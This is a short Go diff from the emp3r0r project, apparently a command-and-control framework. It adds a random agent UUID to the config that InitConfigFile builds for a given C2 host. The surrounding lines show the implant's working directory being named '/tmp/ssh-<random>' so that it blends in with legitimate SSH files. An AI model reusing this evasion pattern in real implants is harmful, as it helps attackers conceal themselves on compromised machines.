@@ -11,6 +11,7 @@ import (
 	"time"
 
 	"github.com/bettercap/readline"
+	"github.com/google/uuid"
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
@@ -317,6 +318,7 @@ func InitConfigFile(cc_host string) (err error) {
 	RuntimeConfig.Timeout = util.RandInt(10000, 20000)
 
 	// random strings
+	RuntimeConfig.AgentUUID = uuid.NewString()
 	agent_root := util.RandStr(util.RandInt(6, 20))
 	RuntimeConfig.AgentRoot = fmt.Sprintf("/tmp/ssh-%v", agent_root)
 	utils_path := util.RandStr(util.RandInt(3, 20))
